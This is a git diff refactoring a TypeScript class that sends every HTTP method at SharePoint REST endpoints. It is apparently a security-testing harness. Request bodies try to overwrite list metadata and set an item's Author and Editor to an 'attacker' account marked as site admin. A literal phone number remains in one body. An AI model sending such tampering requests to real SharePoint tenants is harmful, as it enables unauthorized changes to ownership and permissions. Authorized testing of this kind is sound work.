@@ -105,17 +105,16 @@ export default class DataService {
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/parentList`,
+        `${SITE_URL}/_api/web/lists('${lid}')/items(${itemId})/parentList`,
         JSON.stringify({
           ContentTypesEnabled: false,
           CrawlNonDefaultViews: false,
-          Created: "2024-12-24T04:47:23Z",
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
           CurrentChangeToken: {
-            StringValue:
-              "1;3;4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b;638706161728670000;998946844",
+            StringValue: SHAREPOINT_CONSTANTS.CHANGE_TOKENS.LIST_TOKEN,
           },
           DefaultContentApprovalWorkflowId:
-            "00000000-0000-0000-0000-000000000000",
+            SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           DefaultItemOpenUseListSetting: false,
           Description: "",
           Direction: "none",
@@ -135,7 +134,7 @@ export default class DataService {
           ForceCheckout: false,
           HasExternalDataSource: false,
           Hidden: false,
-          Id: "4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b",
+          Id: lid,
           ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
           ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
           DefaultSensitivityLabelForLibrary: "",
@@ -147,20 +146,20 @@ export default class DataService {
           IsCatalog: false,
           IsPrivate: false,
           ItemCount: 8,
-          LastItemDeletedDate: "2024-12-24T04:47:23Z",
-          LastItemModifiedDate: "2024-12-24T04:50:34Z",
-          LastItemUserModifiedDate: "2024-12-24T04:50:34Z",
+          LastItemDeletedDate: SHAREPOINT_CONSTANTS.DATES.PAST_EXPIRATION,
+          LastItemModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_MODIFIED,
+          LastItemUserModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_USER_MODIFIED,
           ListExperienceOptions: 0,
           ListItemEntityTypeFullName: `"SP.Data.${listName}ListItem"`,
           MajorVersionLimit: 50,
           MajorWithMinorVersionsLimit: 0,
           MultipleDataList: false,
           NoCrawl: false,
-          ParentWebPath: { DecodedUrl: "/sites/test2" },
-          ParentWebUrl: "/sites/test2",
+          ParentWebPath: { DecodedUrl: SHAREPOINT_CONSTANTS.SITE_RELATIVE_URL },
+          ParentWebUrl: SHAREPOINT_CONSTANTS.SITE_RELATIVE_URL,
           ParserDisabled: false,
           ServerTemplateCanCreateFolders: true,
-          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
+          TemplateFeatureId: SHAREPOINT_CONSTANTS.ENTITY_IDS.TEMPLATE_FEATURE_ID,
           Title: "Test",
         })
       );
@@ -168,17 +167,16 @@ export default class DataService {
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/parentList`,
+        `${SITE_URL}/_api/web/lists('${lid}')/items(${itemId})/parentList`,
         JSON.stringify({
           ContentTypesEnabled: false,
           CrawlNonDefaultViews: false,
-          Created: "2024-12-24T04:47:23Z",
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
           CurrentChangeToken: {
-            StringValue:
-              "1;3;4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b;638706161728670000;998946844",
+            StringValue: SHAREPOINT_CONSTANTS.CHANGE_TOKENS.LIST_TOKEN,
           },
           DefaultContentApprovalWorkflowId:
-            "00000000-0000-0000-0000-000000000000",
+            SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           DefaultItemOpenUseListSetting: false,
           Description: "",
           Direction: "none",
@@ -198,7 +196,7 @@ export default class DataService {
           ForceCheckout: false,
           HasExternalDataSource: false,
           Hidden: false,
-          Id: "4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b",
+          Id: lid,
           ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
           ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
           DefaultSensitivityLabelForLibrary: "",
@@ -210,9 +208,9 @@ export default class DataService {
           IsCatalog: false,
           IsPrivate: false,
           ItemCount: 8,
-          LastItemDeletedDate: "2024-12-24T04:47:23Z",
-          LastItemModifiedDate: "2024-12-24T04:50:34Z",
-          LastItemUserModifiedDate: "2024-12-24T04:50:34Z",
+          LastItemDeletedDate: SHAREPOINT_CONSTANTS.DATES.PAST_EXPIRATION,
+          LastItemModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_MODIFIED,
+          LastItemUserModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_USER_MODIFIED,
           ListExperienceOptions: 0,
           ListItemEntityTypeFullName: `"SP.Data.${listName}ListItem"`,
           MajorVersionLimit: 50,
@@ -223,32 +221,31 @@ export default class DataService {
           ParentWebUrl: "/",
           ParserDisabled: false,
           ServerTemplateCanCreateFolders: true,
-          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
+          TemplateFeatureId: SHAREPOINT_CONSTANTS.ENTITY_IDS.TEMPLATE_FEATURE_ID,
           Title: "Test",
         })
       );
     });
     this.sendRequest2(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`
+      `${SITE_URL}/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`
     );
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`,
+        `${SITE_URL}/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`,
         JSON.stringify({
           AllowContentTypes: true,
           BaseTemplate: 100,
           BaseType: 0,
           ContentTypesEnabled: false,
           CrawlNonDefaultViews: false,
-          Created: "2024-12-24T11:55:27Z",
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
           CurrentChangeToken: {
-            StringValue:
-              "1;3;4ece19a6-8e37-412b-a2e4-3ddef5fe089c;638706421062770000;999068341",
+            StringValue: SHAREPOINT_CONSTANTS.CHANGE_TOKENS.LIST_TOKEN,
           },
           DefaultContentApprovalWorkflowId:
-            "00000000-0000-0000-0000-000000000000",
+            SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           DefaultItemOpenUseListSetting: false,
           Description: "",
           Direction: "none",
@@ -268,7 +265,7 @@ export default class DataService {
           ForceCheckout: false,
           HasExternalDataSource: false,
           Hidden: false,
-          Id: "4ece19a6-8e37-412b-a2e4-3ddef5fe089c",
+          Id: lid,
           ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
           ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
           DefaultSensitivityLabelForLibrary: "",
@@ -280,9 +277,9 @@ export default class DataService {
           IsCatalog: false,
           IsPrivate: false,
           ItemCount: 4,
-          LastItemDeletedDate: "2024-12-24T11:55:27Z",
-          LastItemModifiedDate: "2024-12-24T12:45:42Z",
-          LastItemUserModifiedDate: "2024-12-24T12:45:42Z",
+          LastItemDeletedDate: SHAREPOINT_CONSTANTS.DATES.PAST_EXPIRATION,
+          LastItemModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_MODIFIED,
+          LastItemUserModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_USER_MODIFIED,
           ListExperienceOptions: 0,
           ListItemEntityTypeFullName: `"SP.Data.${listName}ListItem"`,
           MajorVersionLimit: 50,
@@ -293,7 +290,7 @@ export default class DataService {
           ParentWebUrl: "/",
           ParserDisabled: false,
           ServerTemplateCanCreateFolders: true,
-          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
+          TemplateFeatureId: SHAREPOINT_CONSTANTS.ENTITY_IDS.TEMPLATE_FEATURE_ID,
           Title: "Test",
         })
       );
@@ -301,21 +298,20 @@ export default class DataService {
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`,
+        `${SITE_URL}/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`,
         JSON.stringify({
           AllowRssFeeds: true,
           AlternateCssUrl: "",
-          AppInstanceId: "00000000-0000-0000-0000-000000000000",
+          AppInstanceId: SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           ClassicWelcomePage: null,
           Configuration: 0,
-          Created: "2024-12-23T12:53:13.77",
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
           CurrentChangeToken: {
-            StringValue:
-              "1;2;27341d3a-24dc-48fc-ae4e-0a439cf859fd;638709731707500000;999929707",
+            StringValue: SHAREPOINT_CONSTANTS.CHANGE_TOKENS.SITE_TOKEN,
           },
           CustomMasterUrl: "/_catalogs/masterpage/seattle.master",
           Description: "",
-          DesignPackageId: "00000000-0000-0000-0000-000000000000",
+          DesignPackageId: SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           DocumentLibraryCalloutOfficeWebAppPreviewersDisabled: false,
           EnableMinimalDownload: false,
           FooterColorIndexInDarkMode: 0,
@@ -329,7 +325,7 @@ export default class DataService {
           HeaderLayout: 0,
           HideTitleInHeader: false,
           HorizontalQuickLaunch: false,
-          Id: "27341d3a-24dc-48fc-ae4e-0a439cf859fd",
+          Id: CONFIG.WEB_ID,
           IsEduClass: false,
           IsEduClassProvisionChecked: false,
           IsEduClassProvisionPending: false,
@@ -337,8 +333,8 @@ export default class DataService {
           IsMultilingual: true,
           IsRevertHomepageLinkHidden: false,
           Language: 1033,
-          LastItemModifiedDate: "2024-12-28T07:34:11Z",
-          LastItemUserModifiedDate: "2024-12-27T20:01:52Z",
+          LastItemModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_MODIFIED,
+          LastItemUserModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_USER_MODIFIED,
           LogoAlignment: 0,
           MasterUrl: "/_catalogs/masterpage/seattle.master",
           MegaMenuEnabled: true,
@@ -346,7 +342,7 @@ export default class DataService {
           NoCrawl: false,
           ObjectCacheEnabled: false,
           OverwriteTranslationsOnChange: false,
-          ResourcePath: { DecodedUrl: "https://tmsobb2.sharepoint.com" },
+          ResourcePath: { DecodedUrl: `${SITE_URL}` },
           QuickLaunchEnabled: true,
           RecycleBinEnabled: true,
           SearchScope: 0,
@@ -358,7 +354,7 @@ export default class DataService {
           TreeViewEnabled: false,
           UIVersion: 15,
           UIVersionConfigurationEnabled: false,
-          Url: "https://tmsobb2.sharepoint.com",
+          Url: `${SITE_URL}`,
           WebTemplate: "SITEPAGEPUBLISHING",
           WelcomePage: "SitePages/Home.aspx",
         })
@@ -366,25 +362,24 @@ export default class DataService {
     });
     this.sendRequest2(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`
+      `${SITE_URL}/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`
     );
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`,
+        `${SITE_URL}/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`,
         JSON.stringify({
           AllowContentTypes: true,
           BaseTemplate: 100,
           BaseType: 0,
           ContentTypesEnabled: false,
           CrawlNonDefaultViews: false,
-          Created: "2024-12-24T11:55:27Z",
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
           CurrentChangeToken: {
-            StringValue:
-              "1;3;4ece19a6-8e37-412b-a2e4-3ddef5fe089c;638706421062770000;999068341",
+            StringValue: SHAREPOINT_CONSTANTS.CHANGE_TOKENS.LIST_TOKEN,
           },
           DefaultContentApprovalWorkflowId:
-            "00000000-0000-0000-0000-000000000000",
+            SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           DefaultItemOpenUseListSetting: false,
           Description: "",
           Direction: "none",
@@ -404,7 +399,7 @@ export default class DataService {
           ForceCheckout: false,
           HasExternalDataSource: false,
           Hidden: false,
-          Id: "4ece19a6-8e37-412b-a2e4-3ddef5fe089c",
+          Id: lid,
           ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
           ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
           DefaultSensitivityLabelForLibrary: "",
@@ -416,9 +411,9 @@ export default class DataService {
           IsCatalog: false,
           IsPrivate: false,
           ItemCount: 4,
-          LastItemDeletedDate: "2024-12-24T11:55:27Z",
-          LastItemModifiedDate: "2024-12-24T12:45:42Z",
-          LastItemUserModifiedDate: "2024-12-24T12:45:42Z",
+          LastItemDeletedDate: SHAREPOINT_CONSTANTS.DATES.PAST_EXPIRATION,
+          LastItemModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_MODIFIED,
+          LastItemUserModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_USER_MODIFIED,
           ListExperienceOptions: 0,
           ListItemEntityTypeFullName: "SP.Data.TestListItem",
           MajorVersionLimit: 50,
@@ -429,7 +424,7 @@ export default class DataService {
           ParentWebUrl: "/",
           ParserDisabled: false,
           ServerTemplateCanCreateFolders: true,
-          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
+          TemplateFeatureId: SHAREPOINT_CONSTANTS.ENTITY_IDS.TEMPLATE_FEATURE_ID,
           Title: "Test",
         })
       );
@@ -437,21 +432,20 @@ export default class DataService {
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`,
+        `${SITE_URL}/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`,
         JSON.stringify({
           AllowRssFeeds: true,
           AlternateCssUrl: "",
-          AppInstanceId: "00000000-0000-0000-0000-000000000000",
+          AppInstanceId: SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           ClassicWelcomePage: null,
           Configuration: 0,
-          Created: "2024-12-23T12:53:13.77",
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
           CurrentChangeToken: {
-            StringValue:
-              "1;2;27341d3a-24dc-48fc-ae4e-0a439cf859fd;638709733547870000;999929977",
+            StringValue: SHAREPOINT_CONSTANTS.CHANGE_TOKENS.SITE_TOKEN,
           },
           CustomMasterUrl: "/_catalogs/masterpage/seattle.master",
           Description: "",
-          DesignPackageId: "00000000-0000-0000-0000-000000000000",
+          DesignPackageId: SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           DocumentLibraryCalloutOfficeWebAppPreviewersDisabled: false,
           EnableMinimalDownload: false,
           FooterColorIndexInDarkMode: 0,
@@ -465,7 +459,7 @@ export default class DataService {
           HeaderLayout: 0,
           HideTitleInHeader: false,
           HorizontalQuickLaunch: false,
-          Id: "27341d3a-24dc-48fc-ae4e-0a439cf859fd",
+          Id: CONFIG.WEB_ID,
           IsEduClass: false,
           IsEduClassProvisionChecked: false,
           IsEduClassProvisionPending: false,
@@ -473,8 +467,8 @@ export default class DataService {
           IsMultilingual: true,
           IsRevertHomepageLinkHidden: false,
           Language: 1033,
-          LastItemModifiedDate: "2024-12-28T07:34:11Z",
-          LastItemUserModifiedDate: "2024-12-27T20:01:52Z",
+          LastItemModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_MODIFIED,
+          LastItemUserModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_USER_MODIFIED,
           LogoAlignment: 0,
           MasterUrl: "/_catalogs/masterpage/seattle.master",
           MegaMenuEnabled: true,
@@ -482,7 +476,7 @@ export default class DataService {
           NoCrawl: false,
           ObjectCacheEnabled: false,
           OverwriteTranslationsOnChange: false,
-          ResourcePath: { DecodedUrl: "https://tmsobb2.sharepoint.com" },
+          ResourcePath: { DecodedUrl: `${SITE_URL}` },
           QuickLaunchEnabled: true,
           RecycleBinEnabled: true,
           SearchScope: 0,
@@ -494,7 +488,7 @@ export default class DataService {
           TreeViewEnabled: false,
           UIVersion: 15,
           UIVersionConfigurationEnabled: false,
-          Url: "https://tmsobb2.sharepoint.com",
+          Url: `${SITE_URL}`,
           WebTemplate: "SITEPAGEPUBLISHING",
           WelcomePage: "SitePages/Home.aspx",
         })
@@ -503,21 +497,21 @@ export default class DataService {
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(2)/ContentType`
+        `${SITE_URL}/_api/web/lists('${lid}')/items(2)/ContentType`
       );
     });
     this.sendRequest2(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Author`
+      `${SITE_URL}/_api/Web/Lists(guid'${lid}')/Author`
     );
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Author`,
+        `${SITE_URL}/_api/Web/Lists(guid'${lid}')/Author`,
         JSON.stringify({
           Title: "K Testt",
           PrincipalType: 1,
-          Email: "attacker@tmsobb2.onmicrosoft.com",
+          Email: `${CONFIG.SHARING.EMAILS.ATTACKER}`,
           Expiration: "",
           IsEmailAuthenticationGuestUser: false,
           IsShareByEmailGuestUser: false,
@@ -529,7 +523,7 @@ export default class DataService {
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Author`,
+        `${SITE_URL}/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Author`,
         JSON.stringify(
           createUserData(
             SHAREPOINT_CONSTANTS.USERS.TMSOBB_EMAIL,
@@ -542,57 +536,57 @@ export default class DataService {
     });
     this.sendRequest2(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`
+      `${SITE_URL}/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`
     );
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`,
+        `${SITE_URL}/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`,
         JSON.stringify({
-          Id: 11,
+          Id: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
           ServerRedirectedEmbedUri: null,
           ServerRedirectedEmbedUrl: "",
           ContentTypeId: "0x010A00A37404FF361E30429BA657CF50DB1989",
           Title: "TMSOBB",
           OData__ColorTag: null,
           ComplianceAssetId: null,
-          Name: "i:0#.f|membership|tmsobb@tmsobb2.onmicrosoft.com",
-          EMail: "tmsobb@tmsobb2.onmicrosoft.com",
+          Name: `i:0#.f|membership|${CONFIG.SHARING.EMAILS.TMSOBB}`,
+          EMail: `${CONFIG.SHARING.EMAILS.TMSOBB}`,
           OtherMail: null,
           UserExpiration: null,
           UserLastDeletionTime: null,
           MobilePhone: null,
           Notes: null,
-          SipAddress: "tmsobb@tmsobb2.onmicrosoft.com",
+          SipAddress: `${CONFIG.SHARING.EMAILS.TMSOBB}`,
           IsSiteAdmin: true,
           Deleted: false,
           UserInfoHidden: false,
           Picture: {
             Description:
-              "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
-            Url: "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
+              SHAREPOINT_CONSTANTS.USERS.TMSOBB_PICTURE_URL,
+            Url: SHAREPOINT_CONSTANTS.USERS.TMSOBB_PICTURE_URL,
           },
           Department: null,
           JobTitle: null,
           FirstName: "TMSOBB",
           LastName: "Testt",
           WorkPhone: "9075197067",
-          UserName: "tmsobb@tmsobb2.onmicrosoft.com",
+          UserName: `${CONFIG.SHARING.EMAILS.TMSOBB}`,
           WebSite: null,
           SPSResponsibility: null,
           Office: null,
-          SPSPictureTimestamp: "63870559229",
+          SPSPictureTimestamp: SHAREPOINT_CONSTANTS.USERS.TMSOBB_PICTURE_TIMESTAMP,
           SPSPicturePlaceholderState: 1,
           SPSPictureExchangeSyncState: null,
           SPSUserType: 0,
-          ID: 11,
-          Modified: "2024-12-24T12:02:18Z",
-          Created: "2024-12-23T12:55:38Z",
-          AuthorId: 11,
-          EditorId: 11,
+          ID: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
+          Modified: SHAREPOINT_CONSTANTS.DATES.MODIFIED_DATE,
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
+          AuthorId: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
+          EditorId: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
           OData__UIVersionString: "1.0",
           Attachments: false,
-          GUID: "6a7e2b80-b18d-4bc1-a42c-4fd57c51dcbd",
+          GUID: SHAREPOINT_CONSTANTS.ENTITY_IDS.USER_GUID,
         })
       );
     });
@@ -604,36 +598,35 @@ export default class DataService {
       '{"parameters":{"__metadata":{"type":"SP.RenderListDataParameters"},"RenderOptions":4098,"OverrideViewXml":"\x3cView\x3e\x3cRowLimit\x3e5000\x3c/RowLimit\x3e\x3c/View\x3e","AllowMultipleValueFilterForTaxonomyFields":true,"AddRequiredFields":true}}';
     this.sendRequest(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/web/GetList(@v1)/RenderExtendedListFormData(itemId=${itemId},formId='editform',mode='2',options=30,cutoffVersion=0)?@v1=%27%2F${listName}%27`
+      `${SITE_URL}/_api/web/GetList(@v1)/RenderExtendedListFormData(itemId=${itemId},formId='editform',mode='2',options=30,cutoffVersion=0)?@v1=%27%2F${listName}%27`
     );
     this.sendRequest(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/web/GetListUsingPath(DecodedUrl=@a1)/RenderListDataAsStream?@a1=%27%2F${listName}%27&TryNewExperienceSingle=TRUE`,
+      `${SITE_URL}/_api/web/GetListUsingPath(DecodedUrl=@a1)/RenderListDataAsStream?@a1=%27%2F${listName}%27&TryNewExperienceSingle=TRUE`,
       body
     );
     this.sendRequest(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/web/GetListUsingPath(DecodedUrl=@a1)/RenderListDataAsStream?@a1=%27%2F${listName}%27&TryNewExperienceSingle=TRUE`,
+      `${SITE_URL}/_api/web/GetListUsingPath(DecodedUrl=@a1)/RenderListDataAsStream?@a1=%27%2F${listName}%27&TryNewExperienceSingle=TRUE`,
       body1
     );
     this.sendRequest2(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/parentList`
+      `${SITE_URL}/_api/web/lists('${lid}')/items(${itemId})/parentList`
     );
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/parentList`,
+        `${SITE_URL}/_api/web/lists('${lid}')/items(${itemId})/parentList`,
         JSON.stringify({
           ContentTypesEnabled: false,
           CrawlNonDefaultViews: false,
-          Created: "2024-12-24T04:47:23Z",
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
           CurrentChangeToken: {
-            StringValue:
-              "1;3;4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b;638706161728670000;998946844",
+            StringValue: SHAREPOINT_CONSTANTS.CHANGE_TOKENS.LIST_TOKEN,
           },
           DefaultContentApprovalWorkflowId:
-            "00000000-0000-0000-0000-000000000000",
+            SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           DefaultItemOpenUseListSetting: false,
           Description: "",
           Direction: "none",
@@ -653,7 +646,7 @@ export default class DataService {
           ForceCheckout: false,
           HasExternalDataSource: false,
           Hidden: false,
-          Id: "4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b",
+          Id: lid,
           ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
           ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
           DefaultSensitivityLabelForLibrary: "",
@@ -665,20 +658,20 @@ export default class DataService {
           IsCatalog: false,
           IsPrivate: false,
           ItemCount: 8,
-          LastItemDeletedDate: "2024-12-24T04:47:23Z",
-          LastItemModifiedDate: "2024-12-24T04:50:34Z",
-          LastItemUserModifiedDate: "2024-12-24T04:50:34Z",
+          LastItemDeletedDate: SHAREPOINT_CONSTANTS.DATES.PAST_EXPIRATION,
+          LastItemModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_MODIFIED,
+          LastItemUserModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_USER_MODIFIED,
           ListExperienceOptions: 0,
           ListItemEntityTypeFullName: `SP.Data.${listName}ListItem`,
           MajorVersionLimit: 50,
           MajorWithMinorVersionsLimit: 0,
           MultipleDataList: false,
           NoCrawl: false,
-          ParentWebPath: { DecodedUrl: "/sites/test2" },
-          ParentWebUrl: "/sites/test2",
+          ParentWebPath: { DecodedUrl: SHAREPOINT_CONSTANTS.SITE_RELATIVE_URL },
+          ParentWebUrl: SHAREPOINT_CONSTANTS.SITE_RELATIVE_URL,
           ParserDisabled: false,
           ServerTemplateCanCreateFolders: true,
-          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
+          TemplateFeatureId: SHAREPOINT_CONSTANTS.ENTITY_IDS.TEMPLATE_FEATURE_ID,
           Title: "Test",
         })
       );
@@ -686,17 +679,16 @@ export default class DataService {
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/parentList`,
+        `${SITE_URL}/_api/web/lists('${lid}')/items(${itemId})/parentList`,
         JSON.stringify({
           ContentTypesEnabled: false,
           CrawlNonDefaultViews: false,
-          Created: "2024-12-24T04:47:23Z",
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
           CurrentChangeToken: {
-            StringValue:
-              "1;3;4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b;638706161728670000;998946844",
+            StringValue: SHAREPOINT_CONSTANTS.CHANGE_TOKENS.LIST_TOKEN,
           },
           DefaultContentApprovalWorkflowId:
-            "00000000-0000-0000-0000-000000000000",
+            SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           DefaultItemOpenUseListSetting: false,
           Description: "",
           Direction: "none",
@@ -716,7 +708,7 @@ export default class DataService {
           ForceCheckout: false,
           HasExternalDataSource: false,
           Hidden: false,
-          Id: "4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b",
+          Id: lid,
           ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
           ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
           DefaultSensitivityLabelForLibrary: "",
@@ -728,9 +720,9 @@ export default class DataService {
           IsCatalog: false,
           IsPrivate: false,
           ItemCount: 8,
-          LastItemDeletedDate: "2024-12-24T04:47:23Z",
-          LastItemModifiedDate: "2024-12-24T04:50:34Z",
-          LastItemUserModifiedDate: "2024-12-24T04:50:34Z",
+          LastItemDeletedDate: SHAREPOINT_CONSTANTS.DATES.PAST_EXPIRATION,
+          LastItemModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_MODIFIED,
+          LastItemUserModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_USER_MODIFIED,
           ListExperienceOptions: 0,
           ListItemEntityTypeFullName: `SP.Data.${listName}ListItem`,
           MajorVersionLimit: 50,
@@ -741,38 +733,37 @@ export default class DataService {
           ParentWebUrl: "/",
           ParserDisabled: false,
           ServerTemplateCanCreateFolders: true,
-          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
+          TemplateFeatureId: SHAREPOINT_CONSTANTS.ENTITY_IDS.TEMPLATE_FEATURE_ID,
           Title: "Test",
         })
       );
     });
     this.sendRequest2(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`
+      `${SITE_URL}/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`
     );
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`,
+        `${SITE_URL}/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`,
         JSON.stringify({
           "odata.metadata":
-            "https://tmsobb2.sharepoint.com/_api/$metadata#SP.ApiData.Webs/@Element",
+            `${SITE_URL}/_api/$metadata#SP.ApiData.Webs/@Element`,
           "odata.type": "SP.Web",
-          "odata.id": "https://tmsobb2.sharepoint.com/_api/Web",
+          "odata.id": `${SITE_URL}/_api/Web`,
           "odata.editLink": "Web",
           AllowRssFeeds: true,
           AlternateCssUrl: "",
-          AppInstanceId: "00000000-0000-0000-0000-000000000000",
+          AppInstanceId: SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           ClassicWelcomePage: null,
           Configuration: 0,
-          Created: "2024-12-23T12:53:13.77",
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
           CurrentChangeToken: {
-            StringValue:
-              "1;2;27341d3a-24dc-48fc-ae4e-0a439cf859fd;638750541870370000;1010560322",
+            StringValue: SHAREPOINT_CONSTANTS.CHANGE_TOKENS.UPDATED_SITE_TOKEN,
           },
           CustomMasterUrl: "/_catalogs/masterpage/seattle.master",
           Description: "",
-          DesignPackageId: "00000000-0000-0000-0000-000000000000",
